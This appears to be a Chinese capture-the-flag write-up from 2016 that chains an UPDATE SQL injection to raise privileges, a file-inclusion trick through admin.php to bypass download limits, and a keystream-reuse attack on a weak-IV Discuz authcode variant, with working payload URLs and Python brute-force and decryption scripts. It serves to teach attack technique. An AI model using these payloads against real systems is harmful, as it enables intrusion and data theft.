@@ -1,0 +1,171 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">三个白帽挑战之我是李雷雷我在寻找韩梅梅系列3——writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Melody有奥妙</a> <span class="bull">·</span> <time title="2016/05/16 17:13" ui-time="" datetime="2016/05/16 17:13" class="published ng-binding ng-isolate-scope">2016/05/16 17:13</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>进入，发现index.php既可登录也可注册，随便试了一下admin/admin还真能登录，后来证实其他人注册的。。</p><p>user.php可以修改资料，测试了一下sex字段可以注入，本地测试发现update注入又这样的特性</p><pre><code>#!php
+update users set sex=[injection_here] where id = 1;
+</code></pre><p>这个语句中[injection_here]部分，如果插入的是一个字段的名称，若这个字段存在，那么返回1,否则返回0.经过http参数传入的都是字符串，除非特别要求不会转换为数字，这里性别是用0和1表示的恰好符合这个条件。不过测试了好久没有结果。第二天出了第一个hint，按照页面提示操作。访问admin.php，发现</p><pre><code>#!bash
+Your power is too low.
+</code></pre><p>所以构造</p><pre><code>#!php
+update users set sex=1,power=1 where id = 1;
+</code></pre><p>出现了文件管理选项，点进去发现有两个文件。test.php,welcome.php，随便点个文件发现是个下载的功能，文件是http://url/file/download.php，显然要在这里做文章，发现可以下载本目录下的文件，但是不能下载download.php，也不能下载别的目录的文件，检测到连续的两个小数点或者出现了斜杠都会提示非法操作，这就很尴尬了。</p><p>仔细看了看所有可以控制的参数，发现admin.php的m参数是这样的</p><pre><code>#!html
+http://url/admin.php?m=filemanager
+</code></pre><p>猜测这里存在任意文件读取，不过和admin.php不在同一个目录， 也不知道这个当前目录名称是什么，于是不管当前目录名称，直接跨。</p><pre><code>#!html
+http://url/admin.php?m=../index
+</code></pre><p>经过截断是失效的</p><p>不过真的返回首页了，那么一处可以下载当前目录的文件，一处可以包含任意的php文件,两处结合可以出现什么样的火花呢？</p><p>猜测download.php的源代码</p><h3>download.php</h3><pre><code>#!php
+&lt;?php
+$file=$_GET['f'];
+if(stripos($file,'..')||stripos($file,'/')){
+    print "Illeagle opperation!";
+}else if(!file_get_contents($file)){
+    print "file not found";
+}else{
+    header('Content-Type:file/documents'); //忘了咋写了。。。乱写一个类型
+    header('Content-Disposition: attachment; filename="'.$file.'"');
+    header('Content-Length:'.filesize($file));
+    readfile(dirname(__FILE__).$file);
+}
+?&gt;
+</code></pre><h3>admin.php(这个后来下载下来的，直接粘帖过来。。)</h3><pre><code>#!php
+&lt;?php 
+require_once('inc/common.php');
+if ($_SESSION['power'] == 1){
+    if (isset($_GET['m'])) {
+        $model = "model/" . $_GET['m'] . ".php";
+        if (!is_file($model)){
+            echo "Model not exist!";
+            exit; 
+        } else {
+            include_once($model);
+        }
+    }
+} else {
+    exit("Error, your power is too low.");
+}
+?&gt;
+</code></pre><p>这样的话，我们只需要把download.php给包含进去，就能改变目录限制啦～最终payload</p><pre><code>#!html
+http://url/admin.php?m=../file/download&amp;f=admin.php
+</code></pre><p>可以看到直接下载下来了。。</p><p>后来给了hint3,下载flag.php（实际上看到群里有人讨论了一下。。猜到了这个文件，后来还是hint了），于是下载下来看</p><pre><code>#!php
+&lt;?php
+require_once('inc/common.php');
+require_once('authcode.php');
+echo "where is the flag?";
+$flag = authcode('4da1JE+SVphprnaoZJlJTsXKmi+hkEFTlkrbShMA6Uq5npWavTX8vFAh3yGYDf6OcbZePTLJIT+rB2sHzmPO2tuVQ','DECODE',$authkey);
+?&gt;
+</code></pre><h3>authcode.php</h3><pre><code>#!php
+&lt;?php
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {  
+   // 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙  
+   $ckey_length = 3;  
+
+   // 密匙  
+   $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);  
+
+   // 密匙a会参与加解密  
+   $keya = md5(substr($key, 0, 16));  
+   // 密匙b会用来做数据完整性验证  
+   $keyb = md5(substr($key, 16, 16));  
+   // 密匙c用于变化生成的密文  
+   $keyc = $ckey_length?($operation == 'DECODE' ? substr($string, 0, $ckey_length): 
+substr(hash('sha256', microtime()), -$ckey_length)) : '';  
+   // 参与运算的密匙  
+   $cryptkey = $keya.md5($keya.$keyc);  
+   $key_length = strlen($cryptkey);  
+   // 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性  
+   // 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确  
+   $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : 
+sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;  
+   $string_length = strlen($string);  
+   $result = '';  
+   $box = range(0, 255);  
+   $rndkey = array();  
+   // 产生密匙簿  
+   for($i = 0; $i &lt;= 255; $i++) {  
+     $rndkey[$i] = ord($cryptkey[$i % $key_length]);  
+   }  
+   // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度  
+   for($j = $i = 0; $i &lt; 256; $i++) {  
+     $j = ($j + $box[$i] + $rndkey[$i]) % 256;  
+     $tmp = $box[$i];  
+     $box[$i] = $box[$j];  
+     $box[$j] = $tmp;  
+   }  
+   // 核心加解密部分  
+   for($a = $j = $i = 0; $i &lt; $string_length; $i++) {  
+     $a = ($a + 1) % 256;  
+     $j = ($j + $box[$a]) % 256;  
+     $tmp = $box[$a];  
+     $box[$a] = $box[$j];  
+     $box[$j] = $tmp;  
+     // 从密匙簿得出密匙进行异或，再转成字符  
+     $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));  
+   }  
+   if($operation == 'DECODE') {  
+     // substr($result, 0, 10) == 0 验证数据有效性  
+     // substr($result, 0, 10) - time() &gt; 0 验证数据有效性  
+     // substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16) 验证数据完整性  
+     // 验证数据有效性，请看未加密明文的格式  
+     if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; 
+substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {  
+       return substr($result, 26);
+     } else {  
+       return '';  
+     }  
+   } else {  
+     // 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因  
+     // 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码  
+     return $keyc.str_replace('=', '', base64_encode($result));  
+   }  
+}
+?&gt;
+</code></pre><p>至于common.php，因为无法跨过这个目录限制，只能包含进去，而没办法下载下来，显而易见key就在common.php里，直接给也没意思了，想办法解。</p><p>这个密码簿形成很复杂我也勉强看看，发现keya和keyb都基本拿不到，keyc可以发现和时间有关，是当前时间戳的sha256的前三个字符，而解密也用到了keyc,那么keyc必定被包含在密文中，否则无法解密，通读代码发现最后密文确实拼接了keyc的前三位，这是唯一的突破口。</p><p>google了一下discuz authcode 缺陷，发现有人指出这个实现的流密码的IV部分太短了，只有四位。而题目给的这个修改版更是只有3位，那么想办法爆破出来就行了，因为keya和keyb都是固定的，生成密码簿只需要做到keya，keyb，keyc都相同就能生成相同的密码簿，注意到之前下载的test.php的内容</p><pre><code>#!php
+&lt;?php 
+require_once(dirname(__FILE__).'/../inc/common.php');
+require_once(dirname(__FILE__).'/../authcode.php');
+if ($_SESSION['power'] == 1){
+    $test = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
+    echo authcode($test,'ENCODE',$authkey);
+} else {
+    exit("Error, your power is too low.");
+}
+?&gt;
+</code></pre><p>提供了一组明文，那么不断的访问这个页面就可以得到密文，爆破前三位，当前三位相同的时候流密码所使用的key也就相同了，以下是简单的爆破脚本</p><h3>web.py</h3><pre><code>#!python
+import requests
+url1 = 'http://408ffe393d342329a.jie.sangebaimao.com/file/test.php'
+url2 = 'http://408ffe393d342329a.jie.sangebaimao.com/index.php'
+url3 = 'http://408ffe393d342329a.jie.sangebaimao.com/user.php'
+s = requests.session()
+data = {'username':'admin','password':'admin','submit':'login'}
+res=s.post(url2,data=data);
+c=s.get(url1)
+while c.content[0:3]!='4da':
+    c=s.get(url1)
+    print c.content[0:3]
+
+print c.content
+</code></pre><p>因为只有三位大概三四分钟就爆破出来一个符合条件的密文。回头看看authcode.php中加密函数的关键内容。</p><pre><code>#!php
+for($a = $j = $i = 0; $i &lt; $string_length; $i++) {  
+    $a = ($a + 1) % 256;  
+    $j = ($j + $box[$a]) % 256;  
+    $tmp = $box[$a];  
+    $box[$a] = $box[$j];  
+    $box[$j] = $tmp;  
+    // 从密匙簿得出密匙进行异或，再转成字符  
+    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));  
+}  
+</code></pre><p>可见，密文（这里还没把keyc拼接上去）的每一个字符都是通过一次xor运算得到的。而xor的另一个操作数是固定不变的。那么通过两次xor就能解出明文了。但是这样还不行，我们再分析一下密文的构成。</p><pre><code>#!php
+$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : 
+sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;  
+
+return $keyc.str_replace('=', '', base64_encode($result));
+</code></pre><p>所以目标就很明确喽，获得的密文，前三位是动态密钥，接着26位如果密钥相同也就是固定不变的，真正的密文从第29位开始，我这里去掉了密文的前三位，补全了等号，再做的解密。</p><h3>exp.py</h3><pre><code>#!python
+import base64
+flagcode='1JE+SVphprnaoZJlJTsXKmi+hkEFTlkrbShMA6Uq5npWavTX8vFAh3yGYDf6OcbZePTLJIT+rB2sHzmPO2tuVQ=='
+testcode='1JE+SVphprnaoZMwdTdAfTy5hRlRHlspMHwQWPdxqCgEY/nV4uAQwTCcJjyge8HOK6eYL9/28l61TX/dNzAIf3R7wDnRqqFsj5chZoMsnjjvy1UbpdRiEg=='
+test='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
+testcode_b64decode=base64.b64decode(testcode)[26:]
+flagcode_b64decode=base64.b64decode(flagcode)[26:]
+flag=''
+for i in range(0,len(flagcode_b64decode)):
+    flag+=chr(ord(flagcode_b64decode[i])^(ord(testcode_b64decode[i])^ord(test[i])))
+
+print flag
+</code></pre><p>得到flag</p><pre><code>#!bash
+miao{de142af548c3b52fd754c1c29a100b67}
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">CCoday</span> <span class="reply-time">2016-05-20 23:17:15</span></div><p></p><p>@Virink 看到admin被抢注了，注册了admin1，admin11的路过...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Virink</span> <span class="reply-time">2016-05-20 14:50:13</span></div><p></p><p>@PiaCa 谢谢夸奖、、我是第一个注册的~~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jsbug</span> <span class="reply-time">2016-05-18 13:17:27</span></div><p></p><p>@sb 这个注释是当年aullik5写 《Discuz! authcode() 弱IV缺陷 》的分析。<br>http://blog.chinaunix.net/uid-27070210-id-3256117.html</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sb</span> <span class="reply-time">2016-05-18 10:37:40</span></div><p></p><p>&quot;用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度 &quot;<br>第一次听说RC4没用的，拜托写文章之前过过脑子别想当然</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Grayon</span> <span class="reply-time">2016-05-17 16:51:35</span></div><p></p><p>是不是一个人提权了admin结果大家都用的admin，就都被提权了。。。<br>authcode还改了一个地方就是keyc使用的hash是sha265，生成的是十六进制字符，<br>所以破解三位只要16x16x16=4096次即可出现相同的动态密钥<br>加密解密就是异或</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">scanf</span> <span class="reply-time">2016-05-16 17:36:41</span></div><p></p><p>可惜不会解密</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">PiaCa</span> <span class="reply-time">2016-05-16 17:33:54</span></div><p></p><p>我还以为是故意留的 admin / admin，注册这个帐号的真是好人啊 1024</p><p></p></div></div></div></div></div></main>
